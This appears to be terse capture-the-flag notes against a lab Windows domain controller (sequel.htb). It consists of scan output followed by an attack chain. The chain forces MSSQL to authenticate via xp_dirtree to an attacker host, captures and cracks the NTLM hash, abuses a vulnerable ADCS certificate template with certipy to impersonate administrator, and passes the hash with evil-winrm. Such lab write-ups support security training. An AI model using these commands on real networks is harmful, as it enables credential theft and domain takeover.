# Rust-Scan:

Open 10.129.228.253:53
Open 10.129.228.253:88
Open 10.129.228.253:135
Open 10.129.228.253:139
Open 10.129.228.253:389
Open 10.129.228.253:445
Open 10.129.228.253:464
Open 10.129.228.253:593
Open 10.129.228.253:636
Open 10.129.228.253:1433
Open 10.129.228.253:3268
Open 10.129.228.253:3269
Open 10.129.228.253:5985
Open 10.129.228.253:9389
Open 10.129.228.253:49667
Open 10.129.228.253:49691
Open 10.129.228.253:49692
Open 10.129.228.253:49711
Open 10.129.228.253:49715


# Nmap:

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2024-04-13 18:13:41Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
1433/tcp  open  ms-sql-s      syn-ack Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.129.228.253:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.129.228.253:1433: 
|     Target_Name: sequel
|     NetBIOS_Domain_Name: sequel
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: dc.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.1776
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49691/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         syn-ack Microsoft Windows RPC
49711/tcp open  msrpc         syn-ack Microsoft Windows RPC
49715/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

# smbmap:

		Sharename       Type      Comment
        ---------       ----      -------
        ADMIN           Disk      Remote Admin
        C$              Disk      Default share
        IPC$             IPC      Remote IPC
        NETLOGON        Disk      Logon server share 
        Public          Disk      
        SYSVOL          Disk      Logon server share 


$ smbclient \\\\$IP\\Public -N -c

Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Nov 19 17:21:25 2022
  ..                                  D        0  Sat Nov 19 17:21:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 19:09:43 2022


# MSSQL - SMB STEAL HASH:

xp_dirtree '\\<attacker_IP>\any\thing'

# Capture hash
sudo responder -I tun0

hashcat -a 0 -m 5600  hash.txt /usr/share/wordlists/rockyou.txt

evil-winrm -u sql_svc  -p '<password-cracked>'  -i $IP

cd  C:/SQLServer/Logs

type ERRORLOG.bak

certipy-ad find -u Ryan.Cooper -p <password> -dc-ip $IP -text -stdout -vulnerable


certipy-ad req -u Ryan.Cooper -p <password> -target sequel.htb -upn administrator@sequel.htb -ca sequel-DC-CA -template UserAuthentication -debug


sudo ntpdate $IP

certipy-ad auth -pfx administrator.pfx -debug

Got hash for 'administrator@sequel.htb': <hash>


evil-winrm -i sequel.htb -u administrator -H '<hash>'
